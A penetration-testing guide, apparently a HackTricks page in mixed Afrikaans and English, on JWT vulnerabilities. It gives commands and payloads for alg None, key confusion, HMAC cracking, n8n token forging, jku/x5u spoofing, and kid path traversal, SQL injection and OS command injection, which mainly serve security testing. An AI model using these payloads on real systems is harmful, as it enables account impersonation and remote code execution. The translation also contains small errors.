# JWT Kwetsbaarhede (Json Web Tokens)

{{#include ../banners/hacktricks-training.md}}

**Deel van hierdie pos is gebaseer op die wonderlike pos:** [**https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\
**Skrywer van die wonderlike hulpmiddel om JWTs te pentest** [**https://github.com/ticarpi/jwt_tool**](https://github.com/ticarpi/jwt_tool)

### **Vinnige wins**

Voer [**jwt_tool**](https://github.com/ticarpi/jwt_tool) uit met die modus `All Tests!` en wag vir groen reëls
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
As jy gelukkig is, sal die tool 'n geval vind waar die webtoepassing die JWT verkeerd nagaan:

![](<../images/image (935).png>)

Dan kan jy die request in jou proxy soek of die gebruikte JWT vir daardie request dump met die jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

### Praktiese JWT-assessering-werksvloei

- **Bepaal die omvang van sessiebeheer**: Kies 'n user-specific request (bv., profile, billing). Verwyder cookies/headers een-vir-een totdat die versoek geweier word om te isoleer watter token(s) eintlik gate toegang tot authorization.
- **Lokaliseer JWTs in verkeer**: They often sit in `Authorization: Bearer <JWT>`, but also appear in custom headers or cookies. If Burp doesn’t highlight them, use Target → Site map → Engagement tools → Search with regex patterns such as:
- `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
- `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`
- **Dekodeer en enumereer**: Gebruik Burp **JWT Editor** of `python3 jwt_tool.py <JWT>` om header/payload te lees. Let op `alg`, `exp`/token lifetime, en authn/authz-driving claims (`role`, `id`, `username`, `email`, etc.).
- **Kontroleer of handtekening toegepas word (signature enforcement sanity check)**: Flip of verwyder 'n paar bytes in die signature-portion en replay die versoek. As dit aanvaar word, impliseer dit ontbrekende signature verification en jy kan payload-claims direk manipuleer.
- **Doel**: Wysig payload claims om voorregte te eskaleer; elke aanval hieronder poog om die server te kry om 'n gemanipuleerde payload te aanvaar deur swak verification, swak secrets, of onveilige sleutelkeuse te misbruik.

### Manipuleer data sonder om iets te wysig

Jy kan net met die data tamper en die handtekening ongewysig los om te kyk of die server die handtekening kontroleer. Probeer byvoorbeeld jou username na "admin" verander.

#### **Is die token geverifieer?**

Om te kontroleer of 'n JWT se handtekening geverifieer word:

- 'n Foutboodskap dui op lopende verifikasie; sensitiewe besonderhede in uitvoerige foutboodskappe moet nagegaan word.
- 'n Verandering in die teruggegewe bladsy dui ook op verifikasie.
- Geen verandering dui op geen verifikasie nie; dit is wanneer jy kan eksperimenteer met die manipulasie van payload-claims.

### Oorsprong

Dit is belangrik om te bepaal of die token server-side of client-side gegenereer is deur die proxy se versoekgeskiedenis te ondersoek.

- Tokens wat eers vanaf die client-side gesien word dui daarop dat die sleutel moontlik in client-side code blootgestel is, wat verdere ondersoek noodsaak.
- Tokens wat server-side ontstaan, dui op 'n veilige proses.

### Duur

Kontroleer of die token langer as 24h hou... dalk verval dit nooit. As daar 'n `exp`-veld is, kontroleer of die server dit korrek hanteer.

### Brute-force HMAC secret

[**See this page.**](../generic-hacking/brute-force.md#jwt)

If the header uses **HS256**, dump the token to a file and try offline cracking:
```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```
Sodra die geheim teruggevind is, laai dit as 'n symmetric key in Burp JWT Editor en herteken die gewysigde claims.

### Aflei JWT geheime uit leaked konfigurasie + DB data

As 'n arbitrêre lêerlees (of backup leak) beide **toepassings-enkripsiemateriaal** en **gebruikersrekords** blootstel, kan jy soms die JWT signing secret herkonstrueer en session cookies vervals sonder om enige plaintext-wagwoorde te ken. Voorbeeldpatroon waargeneem in workflow automation stacks:

1. Leak die app key (e.g., `encryptionKey`) from a config file.
2. Leak die user table om `email`, `password_hash`, en `user_id` te bekom.
3. Aflei die signing secret vanaf die sleutel, en dan die per-user hash aflei wat in die JWT payload verwag word:
```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()              # signing key
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```
4. Plaas die ondertekende token in die sessie-cookie (bv. `n8n-auth`) om die gebruiker/admin-rekening te imiteer, selfs al is die wagwoord-hash gesout.

### Wysig die algoritme na None

Stel die algoritme as "None" en verwyder die handtekeningdeel.

Gebruik die Burp-uitbreiding genaamd "JSON Web Token" om hierdie kwesbaarheid te toets en verskillende waardes binne die JWT te verander (stuur die versoek na Repeater en in die "JSON Web Token" oortjie kan jy die waardes van die token wysig. Jy kan ook kies om die waarde van die "Alg" veld op "None" te sit).

### Verander die algoritme RS256(asymmetric) na HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)

Die algoritme HS256 gebruik die geheime sleutel om elke boodskap te onderteken en te verifieer.\
Die algoritme RS256 gebruik die private sleutel om die boodskap te onderteken en gebruik die publieke sleutel vir verifikasie.

As jy die algoritme van RS256 na HS256 verander, sal die back-end kode die publieke sleutel as die geheime sleutel gebruik en dan die HS256-algoritme gebruik om die handtekening te verifieer.

Deur die publieke sleutel te gebruik en RS256 na HS256 te verander, kan ons 'n geldige handtekening skep. Jy kan die sertifikaat van die webbediener kry deur die volgende uit te voer:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
Using Burp **JWT Editor**, importeer die RSA public key (from `/.well-known/jwks.json` or a PEM) en voer **Attack → HMAC Key Confusion Attack** uit om die HS256 re-sign poging te outomatiseer.

### Nuwe publieke sleutel in die header

'n Aanvaller bêre 'n nuwe sleutel in die header van die token en die bediener gebruik hierdie nuwe sleutel om die handtekening te verifieer (CVE-2018-0114).

This can be done with the "JSON Web Tokens" Burp extension.\
(Send the request to the Repeater, inside the JSON Web Token tab select "CVE-2018-0114" and send the request).

### JWKS Spoofing

Die instruksies beskryf 'n metode om die sekuriteit van JWT tokens te evalueer, veral dié wat 'n "jku" header claim gebruik. Hierdie claim moet na 'n JWKS (JSON Web Key Set) lêer verwys wat die publieke sleutel bevat wat nodig is vir die token se verifikasie.

- **Beoordeling van tokens met "jku" header**:
- Verifieer die "jku" claim se URL om te verseker dit lei na die toepaslike JWKS-lêer.
- Wysig die token se "jku" waarde om na 'n beheerde webdiens te verwys, sodat jy verkeer kan monitor.
- **Monitering vir HTTP-interaksie**:
- Waarneming van HTTP-versoeke na jou gespesifiseerde URL dui daarop dat die bediener probeer om sleutels vanaf jou verskafde skakel te haal.
- Wanneer jy `jwt_tool` vir hierdie proses gebruik, is dit noodsaaklik om die `jwtconf.ini`-lêer by te werk met jou persoonlike JWKS-ligging om die toetsing te vergemaklik.
- **Opdrag vir `jwt_tool`**:

- Voer die volgende opdrag uit om die scenario met `jwt_tool` te simuleer:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Oorsig van kid-kwessies

'n Opsionele header-claim bekend as `kid` word gebruik om 'n spesifieke sleutel te identifiseer, wat veral belangrik is in omgewings waar meerdere sleutels bestaan vir token-handtekeningverifikasie. Hierdie claim help om die toepaslike sleutel te kies om 'n token se handtekening te verifieer.

#### Sleutel openbaar deur `kid`

Wanneer die `kid` claim in die header voorkom, is dit raadsaam om die web-gids te deursoek vir die ooreenstemmende lêer of variante daarvan. Byvoorbeeld, as `"kid":"key/12345"` gespesifiseer is, moet jy in die web root soek na _/key/12345_ en _/key/12345.pem_.

#### Path Traversal with "kid"

Die `kid` claim kan ook uitgebuit word om deur die lêerstelsel te navigeer, wat moontlik die keuse van 'n arbitrêre lêer toelaat. Dit is haalbaar om vir konneksie te toets of Server-Side Request Forgery (SSRF) aanvalle uit te voer deur die `kid`-waarde te verander om spesifieke lêers of dienste te teiken. Om die JWT te manipuleer en die `kid`-waarde te verander terwyl die oorspronklike handtekening behou word, kan bereik word met die `-T` vlag in jwt_tool, soos hieronder gedemonstreer:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Deur lêers met voorspelbare inhoud te teiken, is dit moontlik om 'n geldige JWT te vervals. Byvoorbeeld, die `/proc/sys/kernel/randomize_va_space` lêer in Linux-stelsels, bekend daarvoor dat dit die waarde **2** bevat, kan in die `kid`-parameter gebruik word met **2** as die simmetriese wagwoord vir JWT-generering.

'n Praktiese patroon vir bros file-system key loading is om 'n HS256 sleutel te genereer met JWK `k` gestel op `AA==`, `kid` te stel na 'n traversal soos `../../../../../../../dev/null`, en heronderteken — sommige implementasies beskou die leë lêer as 'n geldige HMAC secret en sal vervalste tokens aanvaar.

#### SQL Injection via "kid"

As die inhoud van die `kid`-claim gebruik word om 'n wagwoord uit 'n databasis te haal, kan 'n SQL injection gefasiliteer word deur die `kid`-payload te wysig. 'n Voorbeeldpayload wat SQL injection gebruik om die JWT-ondertekeningsproses te verander sluit in:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Hierdie verandering dwing die gebruik van 'n bekende geheime sleutel, `ATTACKER`, vir JWT-ondertekening.

#### OS Injection through "kid"

'n Situasie waar die `kid`-parameter 'n lêerpad spesifiseer wat binne 'n command execution konteks gebruik word, kan lei tot Remote Code Execution (RCE) kwesbaarhede. Deur opdragte in die `kid`-parameter te inject, is dit moontlik om private keys bloot te lê. 'n Voorbeeldpayload om RCE en sleutelblootstelling te bereik is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
If the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

First you need to create a new certificate with new private & public keys
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Dan kan jy byvoorbeeld [**jwt.io**](https://jwt.io) gebruik om die nuwe JWT te skep met die **gegenereerde public and private keys en deur die parameter jku na die gemaakte sertifikaat te wys.** Om 'n geldige jku-sertifikaat te skep, kan jy die oorspronklike een aflaai en die nodige parameters verander.

Jy kan die parameters "e" en "n" uit 'n publieke sertifikaat verkry met behulp van:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
As die verifieerder sleutelmateriaal op afstand aflaai, bêre 'n Burp Collaborator URL in `jku`/`x5u` deur **JWT Editor → Attack → Embed Collaborator payload** te gebruik. Enige callback bevestig SSRF-styl sleutelherwinning; host dan jou eie JWKS/PEM by daardie URL en herteken met jou private sleutel sodat die diens aanvaller-geskepte tokens valideer.

#### x5u

X.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. Die eerste sertifikaat in die stel moet dié wees wat gebruik is om hierdie JWT te teken. Die volgende sertifikate teken elk die vorige een, en voltooi sodoende die sertifikaatsketting. X.509 word gedefinieer in RFC 52807. Transportsekuriteit is vereis om die sertifikate oor te dra.

Probeer **verander hierdie header na 'n URL onder jou beheer** en kyk of enige versoek ontvang word. In daardie geval **kan jy die JWT manipuleer**.

Om 'n nuwe token te vervals met 'n sertifikaat wat deur jou beheer word, moet jy die sertifikaat skep en die publieke en private sleutels uittrek:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Dan kan jy byvoorbeeld [**jwt.io**](https://jwt.io) gebruik om die nuwe JWT te skep met die **gegenereerde publieke en private sleutels en deur die parameter x5u na die geskepte .crt-sertifikaat te wys.**

![](<../images/image (956).png>)

Jy kan ook beide hierdie vulns **vir SSRFs** misbruik.

#### x5c

Hierdie parameter kan die **sertifikaat in base64** bevat:

![](<../images/image (1119).png>)

As die aanvaller **'n self-ondertekende sertifikaat genereer** en 'n vervalste token skep wat die ooreenstemmende private sleutel gebruik en die waarde van die "x5c" parameter vervang met die nuut-gegenereerde sertifikaat en die ander parameters, naamlik n, e en x5t, wysig, sal die vervalste token in wese deur die bediener aanvaar word.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Ingebedde Openbare Sleutel (CVE-2018-0114)

As die JWT 'n ingebedde openbare sleutel het soos in die volgende scenario:

![](<../images/image (624).png>)

Deur die volgende nodejs-skrip te gebruik, is dit moontlik om 'n openbare sleutel uit daardie data te genereer:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Dit is moontlik om 'n nuwe private/public key te genereer, die nuwe public key in die token in te sluit en dit te gebruik om 'n nuwe signature te genereer:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Jy kan die "n" en "e" kry met hierdie nodejs-skrip:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### ES256: Die private sleutel openbaar maak as dieselfde nonce gebruik word

If some applications use ES256 and use the same nonce to generate two jwts, the private key can be restored.

Here is a example: [ECDSA: Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

The JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can be used to prevent the token from being replayed.\
However, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001 and 10001 are going to use the same ID. So if the backend is incrementig the ID on each request you could abuse this to **herhaal 'n versoek** (needing to send 10000 request between each successful replay).

### JWT Geregistreerde claims


{{#ref}}
https://www.iana.org/assignments/jwt/jwt.xhtml#claims
{{#endref}}

### Other attacks

**Cross-service Relay Attacks**

Dit is waargeneem dat sommige webtoepassings op 'n vertroude JWT-diens staatmaak vir die generering en bestuur van hul tokens. Daar is voorvalle waar 'n token, gegenereer vir een kliënt deur die JWT-diens, deur 'n ander kliënt van dieselfde JWT-diens aanvaar is. As die uitreiking of vernuwing van 'n JWT via 'n derdeparty-diens waargeneem word, behoort die moontlikheid ondersoek te word om 'n rekening op 'n ander kliënt van daardie diens te registreer met dieselfde gebruikersnaam/e-pos. Daarna behoort 'n poging aangewend te word om die verkrygde token in 'n versoek na die teiken te herhaal om te sien of dit aanvaar word.

- Die aanvaarding van jou token kan 'n kritieke probleem aandui en moontlik die vervalsing van enige gebruiker se rekening toelaat. Let wel dat toestemming vir breër toetse benodig mag word indien jy op 'n derdeparty-toepassing registreer, aangesien dit 'n regsgrey-area kan raak.

**Expiry Check of Tokens**

Die token se verstryking word geverifieer deur die "exp" Payload claim. Aangesien JWTs dikwels sonder sessions gegebruik word, is noukeurige hantering noodsaaklik. In baie gevalle kan dit moontlik wees om 'n ander gebruiker se JWT te vang en te herhaal, wat impersonasie van daardie gebruiker sal toelaat. Die JWT RFC beveel aan om JWT-replay-aanvalle te verlig deur die "exp" claim te gebruik om 'n vervaltyd vir die token te stel. Verder is dit kritiek dat die toepassing toepaslike kontroles implementeer om te verseker dat hierdie waarde verwerk word en dat vervalde tokens verwerp word. As die token 'n "exp" claim bevat en tydsbeperkings tydens toetsing dit toelaat, word dit aanbeveel om die token te stoor en dit ná die verstrykingstyd te herhaal. Die inhoud van die token, insluitend tydstempelparsings en vervalkontrole (tijdstempel in UTC), kan met die jwt_tool se -R vlag gelees word.

- 'n Sekuriteitsrisiko mag bestaan as die toepassing steeds die token valideer, aangesien dit kan impliseer dat die token moontlik nooit verval nie.

### Gereedskap

- [jwt_tool](https://github.com/ticarpi/jwt_tool) – dekodering, claim/header manipulering, offline secret cracking (`-C`) en semi-outomatiese aanvalsmodes (`-M at`).
- [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) – decode/re-sign in Repeater, genereer pasgemaakte sleutels, en voer ingeboude attacks uit (**none**, **HMAC key confusion**, **embedded JWK**, **jku/x5u collaborator payloads**).
- [hashcat](https://hashcat.net/hashcat/) `-m 16500` – GPU-versnelde HS256 secret cracking na die uitvoer van JWTs na 'n woordlys.


{{#ref}}
https://github.com/ticarpi/jwt_tool
{{#endref}}

## References

- [n8n token forge chain – config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
- [Burp Suite – JWT Editor extension](https://github.com/PortSwigger/jwt-editor)
- [jwt_tool attack methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [Keys to JWT Assessments – TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)

{{#include ../banners/hacktricks-training.md}}
